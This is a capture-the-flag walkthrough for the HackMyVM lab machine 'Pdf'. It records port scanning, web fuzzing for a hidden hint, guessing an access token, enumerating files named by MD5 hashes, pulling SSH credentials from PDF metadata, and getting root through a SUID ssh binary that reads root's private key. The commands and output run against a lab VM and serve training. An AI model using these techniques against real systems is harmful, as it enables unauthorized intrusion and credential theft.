# Pdf

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Pdf | Sublarge | Beginner | HackMyVM |

**Summary:** This machine demonstrates a comprehensive attack chain involving web enumeration, token-based authentication bypass, MD5 hash-based file enumeration, PDF metadata analysis for credential extraction, and SSH-based privilege escalation. The challenge begins with discovering hidden hints in web source code, exploits a File Management System using predictable MD5 hashes for document access, extracts credentials from PDF metadata using ExifTool, and culminates in root access through SSH key misconfiguration. This beginner-friendly machine teaches fundamental penetration testing concepts including directory fuzzing, session management, file analysis, and privilege escalation techniques.

---

## Reconnaissance

### Network Discovery
Initial network scanning revealed the target machine in the VirtualBox environment:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.39 08:00:27:E6:C0:08 VirtualBox
```

### Port Scanning
Comprehensive Nmap scan revealed three active services on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.39
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 16:30 WIB
Nmap scan report for 192.168.100.39
Host is up (0.0020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: The Evolution of PDF Format
8080/tcp open  http    Golang net/http server
|_http-title: File Management System
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.38 seconds
```

The scan identified:
- **Port 22**: SSH service (OpenSSH 8.4p1 Debian)
- **Port 80**: Apache HTTP server hosting "The Evolution of PDF Format"
- **Port 8080**: Golang HTTP server running "File Management System"

### Web Application Analysis

#### Port 80 - PDF Evolution Website
The main website displays a professional presentation about PDF format evolution:

![](image.png)

The website presents a visually appealing timeline and information about PDF format development. Analysis of the source code revealed an interesting HTML comment hint:

```javascript
...
<!-- Footer -->
<!-- hint: .txt -->
<footer class="bg-secondary text-white py-12">
...
```

This hidden comment suggests the existence of a hint file with a `.txt` extension.

#### Port 8080 - File Management System
The secondary service presents a login interface for a file management system:

![](image-1.png)

The interface shows a clean, professional design with the message "Enter the access token to unlock the system." The source code analysis reveals the authentication mechanism:

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Management System</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
        .container { max-width: 800px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; }
        .error { color: red; text-align: center; }
        .hint { color: #555; text-align: center; font-style: italic; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        #pdf-viewer { width: 100%; height: 600px; border: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>File Management System</h2>
        
            <p class="hint">Enter the access token to unlock the system.</p>
            <form method="POST" action="/">
                <input type="text" name="token" placeholder="Enter token" required>
                <button type="submit">Submit</button>
            </form>
            
        
    </div>
</body>
</html>
```

The system uses a simple POST-based token authentication mechanism.

---

## Initial Access

### Directory Enumeration
Following the hint discovered in the source code, directory fuzzing was performed to locate the hidden hint file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://192.168.100.39/FUZZ.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.39/FUZZ.txt
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

...
hint                    [Status: 200, Size: 44, Words: 7, Lines: 2, Duration: 150ms]
:: Progress: [207643/207643] :: Job [1/1] :: 437 req/sec :: Duration: [0:02:06] :: Errors: 0 ::
```

### Token Discovery
Accessing the discovered hint file revealed a cultural reference question:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i http://192.168.100.39/hint.txt
HTTP/1.1 200 OK
Date: Tue, 27 Jan 2026 09:55:46 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Tue, 24 Jun 2025 08:29:00 GMT
ETag: "2c-6384d1eccd07a"
Accept-Ranges: bytes
Content-Length: 44
Content-Type: text/plain

What's the ultimate answer to the universe?
```

This question references Douglas Adams' "The Hitchhiker's Guide to the Galaxy," where the ultimate answer to life, the universe, and everything is **42**.

### Authentication Bypass
Using the discovered token "42" to authenticate to the File Management System:

![](image-2.png)

The post-authentication interface reveals the system's functionality. The interface shows examples of accessing files using MD5 hashes:
- `c4ca4238a0b923820dcc509a6f75849b.pdf` (MD5 hash of "1")
- `c81e728d9d4c2f636f067f89cc14862c.pdf` (MD5 hash of "2")

This indicates the system uses predictable MD5 hashes for file access, creating an opportunity for systematic enumeration.

### Session Management
Capturing the session cookie for authenticated requests:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i -s -X POST http://192.168.100.39:8080/ -d "token=42" | grep "Set-Cookie"
Set-Cookie: session_token=42; HttpOnly
```

The system sets a simple session token that matches the input token, implementing basic session management.

### Document Enumeration
To systematically explore available documents, MD5 hashes were generated for numbers 1-100:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ for i in {1..100}; do echo -n $i | md5sum | awk '{print $1}'; done > hashes.txt

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ cat hashes.txt
c4ca4238a0b923820dcc509a6f75849b
c81e728d9d4c2f636f067f89cc14862c
eccbc87e4b5ce2fe28308fd9f2a7baf3
a87ff679a2f3e71d9181a67b7542122c
e4da3b7fbbce2345d7772b0674a318d5
...
72b32a1f754ba1c09b3695e0cb6cde7f
...
f899139df5e1059396431415e770c6dd
```

Leveraged `ffuf` to systematically test hashes against the document viewer. After a primary scan revealed the common response size, a secondary scan was performed with a size filter (`-fs`) to pinpoint outliers and identify unique files.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u "http://192.168.100.39:8080/view/?filename=FUZZ.pdf" -w hashes.txt -b "session_token=42" -fs 1191-1194 -v

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.39:8080/view/?filename=FUZZ.pdf
 :: Wordlist         : FUZZ: /home/ouba/hashes.txt
 :: Header           : Cookie: session_token=42
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1191-1194
________________________________________________

[Status: 200, Size: 1219, Words: 108, Lines: 81, Duration: 58ms]
| URL | http://192.168.100.39:8080/view/?filename=72b32a1f754ba1c09b3695e0cb6cde7f.pdf
    * FUZZ: 72b32a1f754ba1c09b3695e0cb6cde7f

:: Progress: [100/100] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

The fuzzing revealed that document 57 (`72b32a1f754ba1c09b3695e0cb6cde7f`) had a unique response size (1219 bytes), indicating it contained different content from the standard template documents.

### Credential Discovery through PDF Analysis
Accessing document 57 through the web interface:

![](image-3.png)

The document displays "Document Number: 57" and appears to be part of a "Corporate document archive" based on the visible content. To extract potentially hidden information, the PDF was downloaded for metadata analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wget --header="Cookie: session_token=42" "http://192.168.100.39:8080/view/?filename=72b32a1f754ba1c09b3695e0cb6cde7f.pdf" -O 57.pdf
--2026-01-27 17:19:31--  http://192.168.100.39:8080/view/?filename=72b32a1f754ba1c09b3695e0cb6cde7f.pdf
Connecting to 192.168.100.39:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1219 (1.2K) [application/pdf]
Saving to: '57.pdf'

57.pdf                                                      100%[========================================================================>]   1.19K  --.-KB/s    in 0s

2026-01-27 17:19:31 (72.2 MB/s) - '57.pdf' saved [1219/1219]
```

Examining the PDF metadata using ExifTool revealed embedded credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ exiftool 57.pdf
ExifTool Version Number         : 13.36
File Name                       : 57.pdf
Directory                       : .
File Size                       : 1219 bytes
File Modification Date/Time     : 2026:01:27 17:19:31+07:00
File Access Date/Time           : 2026:01:27 17:19:36+07:00
File Inode Change Date/Time     : 2026:01:27 17:19:31+07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.3
Linearized                      : No
Page Count                      : 1
Media Box                       : 0, 0, 595.28, 841.89
Producer                        : FPDF 1.7
Title                           : Document 57
Subject                         : File Management System Document
Author                          : welcome:[REDACTED]
Create Date                     : 2026:01:27 04:28:02
Modify Date                     : 2026:01:27 04:28:02
```

The critical discovery is in the **Author** field: `welcome:[REDACTED]`, revealing SSH credentials in the format `username:password`.

### SSH Access
Using the discovered credentials to establish SSH connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh welcome@192.168.100.39
...
welcome@192.168.100.39's password: 
Linux pdf 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
welcome@pdf:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

Successfully obtained user-level access to the PDF machine using the credentials extracted from the PDF metadata.

---

## Privilege Escalation

### SUID Binary Analysis
Performing standard privilege escalation enumeration by identifying SUID binaries on the system:

```bash
welcome@pdf:~$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-sr-x 1 root root 797480 Dec 21  2023 /usr/bin/ssh
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47184 Apr  6  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Apr  6  2024 /usr/bin/su
-rwsr-xr-x 1 root root 34888 Apr  6  2024 /usr/bin/umount
-rwsr-xr-x 1 root root 23448 Jan 13  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-- 1 root messagebus 51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 481608 Dec 21  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
```

The analysis reveals that the SSH binary (`/usr/bin/ssh`) has unusual permissions: `-rwsr-sr-x`, indicating both SUID and SGID bits are set. This configuration suggests potential SSH key access privileges.

### SSH Key Exploitation
Attempting to leverage SSH client privileges to access root's private key:

```bash
welcome@pdf:~$ ssh -i /root/.ssh/id_rsa root@localhost
Linux pdf 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 27 05:49:23 2026 from ::1
root@pdf:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The privilege escalation was successful due to the SSH client's SUID permissions allowing access to root's SSH private key at `/root/.ssh/id_rsa`. This misconfiguration enabled direct root access without requiring password authentication.

### Flag Acquisition
Retrieving both user and root flags to complete the compromise:

```bash
root@pdf:~# cat root.txt /home/welcome/user.txt
flag{root-21d[REDACTED]}
flag{user-8d8[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scan revealed three services - SSH (22), Apache (80), and Golang HTTP server (8080)
2. **Vulnerability Discovery**: Directory fuzzing discovered hint.txt containing "The Hitchhiker's Guide to the Galaxy" reference pointing to token "42"  
3. **Authentication Bypass**: Used token "42" to access the File Management System on port 8080, revealing MD5-based file access mechanism
4. **Document Enumeration**: Generated MD5 hashes for numbers 1-100 and systematically tested them to identify accessible documents
5. **Credential Extraction**: Found document 57 (hash: 72b32a1f754ba1c09b3695e0cb6cde7f) contained credentials "welcome:[REDACTED]" embedded in PDF metadata Author field
6. **Initial Access**: SSH login with discovered credentials provided user-level system access to the PDF machine
7. **Privilege Escalation**: Exploited SSH SUID binary permissions and misconfigured root SSH key access to gain root privileges
8. **Flag Capture**: Successfully retrieved both user and root flags completing the full system compromise